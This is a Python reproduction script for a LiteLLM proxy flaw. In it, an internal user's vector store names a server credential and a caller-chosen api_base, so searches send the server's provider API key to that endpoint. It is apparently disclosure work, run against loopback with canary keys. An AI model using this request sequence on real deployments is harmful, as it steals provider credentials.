#!/usr/bin/env python3
"""Reproduce LiteLLM managed-vector-store provider credential exfiltration.

The rig starts a real LiteLLM proxy at the pinned source commit, a disposable
PostgreSQL database, and a raw loopback HTTP capture upstream. It creates a real
internal user whose key is explicitly allowed to manage vector stores, then
compares a named server credential against a caller-owned control credential.

All credentials are random synthetic canaries. Captures are validated in memory,
then every canary is replaced with a descriptive marker before anything is
written. The process environment is allowlisted and does not inherit provider
credentials from the invoking shell.
"""

import argparse
import contextlib
import hashlib
import json
import os
from pathlib import Path
import secrets
import shutil
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time


HOST = "127.0.0.1"
RUNS = 3
EXPECTED_COMMIT = "e4f25265704e2b2c6cf6e81be2e4c5cffff896f4"
EXPECTED_VERSION = "1.100.0"
SERVER_CREDENTIAL_NAME = "prod-openai"
ALLOWED_ROUTES = ["/vector_store/new", "/v1/model/info", "openai_routes"]
SEARCH_BODY = {"query": "control query"}
UPSTREAM_RESPONSE_BODY = {
    "object": "vector_store.search_results.page",
    "search_query": ["control query"],
    "data": [],
    "has_more": False,
    "next_page": None,
}


class ReproductionError(Exception):
    pass


def require(condition, message):
    if not condition:
        raise ReproductionError(message)


def free_port():
    with socket.socket() as sock:
        sock.bind((HOST, 0))
        return sock.getsockname()[1]


def distinct_ports(count):
    ports = []
    while len(ports) < count:
        candidate = free_port()
        if candidate not in ports:
            ports.append(candidate)
    return ports


def parse_http(raw, kind):
    require(isinstance(raw, bytes) and raw, f"empty raw {kind} capture")
    head, separator, body = raw.partition(b"\r\n\r\n")
    require(separator == b"\r\n\r\n", f"raw {kind} has no HTTP header terminator")
    lines = head.split(b"\r\n")
    require(lines and lines[0], f"raw {kind} has no start line")
    start_line = lines[0].decode("ascii", errors="strict")
    headers = {}
    for line in lines[1:]:
        name, colon, value = line.partition(b":")
        require(colon == b":" and name, f"malformed header in raw {kind}")
        headers[name.decode("ascii").lower()] = value.strip().decode("latin-1")
    if kind == "request":
        parts = start_line.split(" ")
        require(len(parts) == 3 and parts[2].startswith("HTTP/"), "malformed HTTP request line")
    else:
        parts = start_line.split(" ", 2)
        require(len(parts) >= 2 and parts[0].startswith("HTTP/"), "malformed HTTP response line")
    return {"start_line": start_line, "headers": headers, "body": body}


def response_status(raw):
    parsed = parse_http(raw, "response")
    return int(parsed["start_line"].split(" ", 2)[1])


def response_json(raw):
    parsed = parse_http(raw, "response")
    body = parsed["body"]
    if parsed["headers"].get("transfer-encoding", "").lower() == "chunked":
        body = decode_chunked(body)
    return json.loads(body.decode("utf-8"))


def decode_chunked(raw):
    output = bytearray()
    remaining = raw
    while True:
        size_line, separator, remaining = remaining.partition(b"\r\n")
        require(separator == b"\r\n", "malformed chunked response")
        size = int(size_line.split(b";", 1)[0], 16)
        if size == 0:
            return bytes(output)
        require(len(remaining) >= size + 2, "truncated chunked response")
        output.extend(remaining[:size])
        require(remaining[size : size + 2] == b"\r\n", "malformed chunk terminator")
        remaining = remaining[size + 2 :]


def make_request(method, path, body=None, bearer=None, port=None):
    body_raw = b"" if body is None else json.dumps(body, separators=(",", ":")).encode("utf-8")
    headers = [
        f"Host: {HOST}:{port}",
        "User-Agent: kairo-076-reproduction",
        "Accept: application/json",
        "Connection: close",
    ]
    if bearer is not None:
        headers.append(f"Authorization: Bearer {bearer}")
    if body is not None:
        headers.extend(["Content-Type: application/json", f"Content-Length: {len(body_raw)}"])
    return (f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n").encode() + body_raw


def raw_exchange(port, method, path, body=None, bearer=None, timeout=30):
    request_raw = make_request(method, path, body=body, bearer=bearer, port=port)
    with socket.create_connection((HOST, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request_raw)
        chunks = []
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            chunks.append(chunk)
    response_raw = b"".join(chunks)
    parse_http(response_raw, "response")
    return request_raw, response_raw


def read_raw_request(sock):
    buffer = bytearray()
    while b"\r\n\r\n" not in buffer:
        chunk = sock.recv(65536)
        require(chunk, "upstream connection closed before request headers")
        buffer.extend(chunk)
    head, separator, rest = bytes(buffer).partition(b"\r\n\r\n")
    parsed = parse_http(head + separator, "request")
    length = int(parsed["headers"].get("content-length", "0"))
    while len(rest) < length:
        chunk = sock.recv(65536)
        require(chunk, "upstream connection closed before request body")
        rest += chunk
    require(len(rest) == length, "upstream request contains unexpected trailing bytes")
    return head + separator + rest


class RawCaptureServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, address):
        super().__init__(address, RawCaptureHandler)
        self._records = []
        self._lock = threading.Lock()

    def append(self, record):
        with self._lock:
            self._records.append(record)

    def snapshot(self):
        with self._lock:
            return list(self._records)


class RawCaptureHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.request.settimeout(10)
        request_raw = read_raw_request(self.request)
        body = json.dumps(UPSTREAM_RESPONSE_BODY, separators=(",", ":")).encode("utf-8")
        response_raw = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/json\r\n"
            + f"Content-Length: {len(body)}\r\n".encode()
            + b"Connection: close\r\n\r\n"
            + body
        )
        self.server.append({"request_raw": request_raw, "response_raw": response_raw})
        self.request.sendall(response_raw)


@contextlib.contextmanager
def serving(server):
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def random_canaries():
    nonce = secrets.token_urlsafe(24)
    return {
        "master": f"sk-kairo-master-{nonce}",
        "internal": f"sk-kairo-internal-{secrets.token_urlsafe(24)}",
        "server": f"sk-kairo-server-{secrets.token_urlsafe(24)}",
        "control": f"sk-kairo-control-{secrets.token_urlsafe(24)}",
    }


MARKERS = {
    "master": "[MASTER_KEY]",
    "internal": "[INTERNAL_USER_KEY]",
    "server": "[SERVER_PROVIDER_CREDENTIAL]",
    "control": "[CALLER_CONTROL_CREDENTIAL]",
}


def sanitize_bytes(raw, canaries):
    require(isinstance(raw, bytes), "capture must be bytes")
    sanitized = raw
    for name, canary in canaries.items():
        sanitized = sanitized.replace(canary.encode(), MARKERS[name].encode())
    for canary in canaries.values():
        require(canary.encode() not in sanitized, "unsanitized credential canary remains")
    return sanitized


def sanitize_value(value, canaries):
    if isinstance(value, bytes):
        return sanitize_bytes(value, canaries).decode("utf-8")
    if isinstance(value, str):
        return sanitize_bytes(value.encode(), canaries).decode()
    if isinstance(value, dict):
        return {key: sanitize_value(item, canaries) for key, item in value.items()}
    if isinstance(value, list):
        return [sanitize_value(item, canaries) for item in value]
    return value


def require_no_canaries(value, canaries):
    serialized = value if isinstance(value, bytes) else str(value).encode("utf-8")
    for canary in canaries.values():
        require(canary.encode() not in serialized, "unsanitized credential canary remains")


def request_authorization(raw):
    return parse_http(raw, "request")["headers"].get("authorization")


def validate_search_records(exploit, control, canaries):
    require(len(exploit) == RUNS, f"expected {RUNS} exploit records")
    require(len(control) == RUNS, f"expected {RUNS} control records")
    for mode, records, store_id in (
        ("exploit", exploit, "kairo-exploit-store"),
        ("control", control, "kairo-control-store"),
    ):
        for index, record in enumerate(records, 1):
            client_request = parse_http(record["client_request_raw"], "request")
            upstream_request = parse_http(record["upstream_request_raw"], "request")
            require(response_status(record["client_response_raw"]) == 200, f"{mode} run {index} was not HTTP 200")
            require(response_status(record["upstream_response_raw"]) == 200, f"{mode} upstream run {index} was not HTTP 200")
            expected_path = f"/v1/vector_stores/{store_id}/search"
            require(client_request["start_line"] == f"POST {expected_path} HTTP/1.1", f"wrong {mode} client route")
            require(upstream_request["start_line"] == f"POST {expected_path} HTTP/1.1", f"wrong {mode} upstream route")
            require(json.loads(client_request["body"]) == SEARCH_BODY, f"wrong {mode} query body")
            expected = canaries["server"] if mode == "exploit" else canaries["control"]
            other = canaries["control"] if mode == "exploit" else canaries["server"]
            require(request_authorization(record["upstream_request_raw"]) == f"Bearer {expected}", f"wrong {mode} upstream credential")
            require(other.encode() not in record["upstream_request_raw"], f"{mode} contains the other credential")


def safe_run(command, **kwargs):
    return subprocess.run(command, check=True, **kwargs)


def find_binary(name, directory=None):
    candidate = Path(directory, name) if directory else Path(shutil.which(name) or "")
    require(candidate.is_file(), f"could not find required executable: {name}")
    return str(candidate.resolve())


def wait_proxy(port, process, timeout=120):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if process.poll() is not None:
            raise ReproductionError(f"LiteLLM exited during startup with status {process.returncode}")
        try:
            _, response = raw_exchange(port, "GET", "/health/liveliness", timeout=2)
            if response_status(response) == 200:
                return
        except (OSError, ReproductionError):
            pass
        time.sleep(0.2)
    raise ReproductionError("LiteLLM did not become ready before timeout")


def write_proxy_config(path, upstream_port):
    path.write_text(
        "\n".join(
            [
                "general_settings:",
                "  master_key: os.environ/LITELLM_MASTER_KEY",
                "  database_url: os.environ/DATABASE_URL",
                "  store_model_in_db: true",
                "",
                "credential_list:",
                f"  - credential_name: {SERVER_CREDENTIAL_NAME}",
                "    credential_info:",
                "      custom_llm_provider: openai",
                "    credential_values:",
                "      api_key: os.environ/PROVIDER_CANARY_KEY",
                "",
                "model_list:",
                "  - model_name: shared-model",
                "    litellm_params:",
                "      model: openai/gpt-4o-mini",
                f"      litellm_credential_name: {SERVER_CREDENTIAL_NAME}",
                "",
                "litellm_settings:",
                "  telemetry: false",
                "",
            ]
        ),
        encoding="utf-8",
    )


def git_commit(source):
    return subprocess.check_output(["git", "-C", str(source), "rev-parse", "HEAD"], text=True).strip()


def package_version(python, source):
    script = "import importlib.metadata,litellm;print(importlib.metadata.version('litellm'));print(litellm.__file__)"
    env = {"PATH": os.environ.get("PATH", ""), "PYTHONPATH": str(source)}
    lines = subprocess.check_output([python, "-c", script], text=True, env=env).splitlines()
    require(len(lines) == 2, "could not inspect LiteLLM package")
    require(Path(lines[1]).resolve().is_relative_to(source.resolve()), "Python does not import LiteLLM from pinned source")
    return lines[0]


def post(port, path, body, bearer):
    request, response = raw_exchange(port, "POST", path, body=body, bearer=bearer)
    return {"request_raw": request, "response_raw": response}


def get(port, path, bearer):
    request, response = raw_exchange(port, "GET", path, bearer=bearer)
    return {"request_raw": request, "response_raw": response}


def require_status(exchange, expected, name):
    actual = response_status(exchange["response_raw"])
    require(actual == expected, f"{name} returned HTTP {actual}, expected {expected}")


def run(args):
    output = Path(args.output_dir).resolve()
    require(not output.exists(), "output directory already exists")
    source = Path(args.litellm_source).resolve()
    python = Path(args.python).resolve()
    query_engine = Path(args.prisma_query_engine).resolve()
    require(source.is_dir(), "--litellm-source is not a directory")
    require(python.is_file(), "--python is not a file")
    require(query_engine.is_file() and os.access(query_engine, os.X_OK), "Prisma query engine is missing or not executable")
    require(git_commit(source) == args.expect_commit, "LiteLLM source commit does not match --expect-commit")
    version = package_version(str(python), source)
    require(version == args.expect_version, f"expected LiteLLM {args.expect_version}, got {version}")

    initdb = find_binary("initdb", args.postgres_bin)
    pg_ctl = find_binary("pg_ctl", args.postgres_bin)
    createdb = find_binary("createdb", args.postgres_bin)
    proxy_port, upstream_port, postgres_port = distinct_ports(3)
    canaries = random_canaries()
    user_id = f"kairo-internal-{secrets.token_hex(8)}"
    database_name = "litellm_repro"
    records = {"setup": [], "exploit": [], "control": []}

    with tempfile.TemporaryDirectory(prefix="kairo-076-") as temp_name:
        temp = Path(temp_name)
        pgdata = temp / "postgres"
        pglog = temp / "postgres.log"
        proxylog = temp / "litellm.log"
        config = temp / "config.yaml"
        write_proxy_config(config, upstream_port)
        base_env = {
            "PATH": os.environ.get("PATH", ""),
            "HOME": str(Path.home()),
            "LANG": "C.UTF-8",
        }
        safe_run([initdb, "-D", str(pgdata), "-A", "trust", "--no-locale", "-E", "UTF8"], env=base_env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        postgres_started = False
        process = None
        log_stream = proxylog.open("wb")
        capture = RawCaptureServer((HOST, upstream_port))
        try:
            safe_run([pg_ctl, "-D", str(pgdata), "-o", f"-h {HOST} -p {postgres_port}", "-l", str(pglog), "start"], env=base_env, stdout=subprocess.DEVNULL)
            postgres_started = True
            safe_run([createdb, "-h", HOST, "-p", str(postgres_port), database_name], env=base_env, stdout=subprocess.DEVNULL)
            database_url = f"postgresql://{os.environ.get('USER', 'postgres')}@{HOST}:{postgres_port}/{database_name}"
            proxy_env = {
                **base_env,
                "PYTHONPATH": str(source),
                "PRISMA_QUERY_ENGINE_BINARY": str(query_engine),
                "LITELLM_MASTER_KEY": canaries["master"],
                "DATABASE_URL": database_url,
                "PROVIDER_CANARY_KEY": canaries["server"],
                "LITELLM_TELEMETRY": "0",
                "NO_COLOR": "1",
            }
            litellm_bin = python.with_name("litellm")
            require(litellm_bin.is_file(), "Python environment has no litellm executable")
            with serving(capture):
                process = subprocess.Popen(
                    [str(litellm_bin), "--config", str(config), "--host", HOST, "--port", str(proxy_port)],
                    cwd=temp,
                    env=proxy_env,
                    stdout=log_stream,
                    stderr=subprocess.STDOUT,
                )
                wait_proxy(proxy_port, process)

                user_exchange = post(
                    proxy_port,
                    "/user/new",
                    {"user_id": user_id, "user_email": f"{user_id}@example.invalid", "user_role": "internal_user", "auto_create_key": False},
                    canaries["master"],
                )
                require_status(user_exchange, 200, "user creation")
                records["setup"].append({"name": "create-internal-user", **user_exchange})

                key_exchange = post(
                    proxy_port,
                    "/key/generate",
                    {"user_id": user_id, "key": canaries["internal"], "allowed_routes": ALLOWED_ROUTES},
                    canaries["master"],
                )
                require_status(key_exchange, 200, "key generation")
                key_result = response_json(key_exchange["response_raw"])
                require(key_result.get("allowed_routes") == ALLOWED_ROUTES, "generated key has wrong allowed routes")
                records["setup"].append({"name": "generate-routed-internal-key", **key_exchange})

                info_exchange = get(proxy_port, "/v1/model/info", canaries["internal"])
                require_status(info_exchange, 200, "model info")
                info_result = response_json(info_exchange["response_raw"])
                info_models = info_result if isinstance(info_result, list) else info_result.get("data", [])
                credential_names = [item.get("litellm_params", {}).get("litellm_credential_name") for item in info_models]
                require(SERVER_CREDENTIAL_NAME in credential_names, "internal user cannot discover credential reference")
                require(canaries["server"] not in info_exchange["response_raw"].decode("utf-8"), "model info exposed credential value")
                records["setup"].append({"name": "discover-credential-reference", **info_exchange})

                exploit_create = post(
                    proxy_port,
                    "/vector_store/new",
                    {
                        "vector_store_id": "kairo-exploit-store",
                        "custom_llm_provider": "openai",
                        "litellm_credential_name": SERVER_CREDENTIAL_NAME,
                        "litellm_params": {"api_base": f"http://{HOST}:{upstream_port}/v1"},
                    },
                    canaries["internal"],
                )
                require_status(exploit_create, 200, "exploit vector store creation")
                records["setup"].append({"name": "create-exploit-store", **exploit_create})

                control_create = post(
                    proxy_port,
                    "/vector_store/new",
                    {
                        "vector_store_id": "kairo-control-store",
                        "custom_llm_provider": "openai",
                        "litellm_params": {
                            "api_base": f"http://{HOST}:{upstream_port}/v1",
                            "api_key": canaries["control"],
                        },
                    },
                    canaries["internal"],
                )
                require_status(control_create, 200, "control vector store creation")
                records["setup"].append({"name": "create-control-store", **control_create})

                for mode, store_id in (("exploit", "kairo-exploit-store"), ("control", "kairo-control-store")):
                    for trial in range(1, RUNS + 1):
                        before = len(capture.snapshot())
                        exchange = post(
                            proxy_port,
                            f"/v1/vector_stores/{store_id}/search",
                            SEARCH_BODY,
                            canaries["internal"],
                        )
                        require_status(exchange, 200, f"{mode} search {trial}")
                        after = capture.snapshot()
                        require(len(after) == before + 1, f"{mode} search {trial} made an unexpected upstream call count")
                        records[mode].append(
                            {
                                "trial": trial,
                                "client_request_raw": exchange["request_raw"],
                                "client_response_raw": exchange["response_raw"],
                                "upstream_request_raw": after[-1]["request_raw"],
                                "upstream_response_raw": after[-1]["response_raw"],
                            }
                        )

                validate_search_records(records["exploit"], records["control"], canaries)
        finally:
            if process is not None:
                process.terminate()
                with contextlib.suppress(subprocess.TimeoutExpired):
                    process.wait(timeout=10)
                if process.poll() is None:
                    process.kill()
                    process.wait(timeout=5)
            log_stream.close()
            if postgres_started:
                subprocess.run([pg_ctl, "-D", str(pgdata), "stop", "-m", "fast"], env=base_env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)

    sanitized = sanitize_value(records, canaries)
    serialized = json.dumps(sanitized, separators=(",", ":"))
    require_no_canaries(serialized, canaries)
    metadata = {
        "target": "BerriAI/litellm",
        "version": version,
        "commit": args.expect_commit,
        "captured_at": args.captured_at,
        "platform": sys.platform,
        "python": subprocess.check_output([str(python), "--version"], text=True).strip(),
        "database": "PostgreSQL",
        "caller_role": "internal_user",
        "allowed_routes": ALLOWED_ROUTES,
        "credential_reference_discovered_via": "/v1/model/info",
        "runs_per_mode": RUNS,
        "exploit_server_credential_hits": RUNS,
        "control_server_credential_hits": 0,
        "control_caller_credential_hits": RUNS,
        "complete": True,
    }
    output.mkdir(parents=True)
    for name in ("setup", "exploit", "control"):
        path = output / f"{name}.jsonl"
        path.write_text("".join(json.dumps(row, separators=(",", ":")) + "\n" for row in sanitized[name]), encoding="utf-8")
    (output / "metadata.json").write_text(json.dumps(metadata, indent=2) + "\n", encoding="utf-8")
    print("LiteLLM 1.100.0: server credential reached caller endpoint 3/3; matched control 0/3")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--litellm-source", required=True)
    parser.add_argument("--python", required=True)
    parser.add_argument("--prisma-query-engine", required=True)
    parser.add_argument("--postgres-bin", help="directory containing PostgreSQL executables")
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--expect-commit", default=EXPECTED_COMMIT)
    parser.add_argument("--expect-version", default=EXPECTED_VERSION)
    parser.add_argument("--captured-at", default="2026-09-10")
    args = parser.parse_args()
    try:
        run(args)
    except (OSError, ReproductionError, subprocess.SubprocessError, json.JSONDecodeError, UnicodeError) as exc:
        print(f"reproduction failed: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
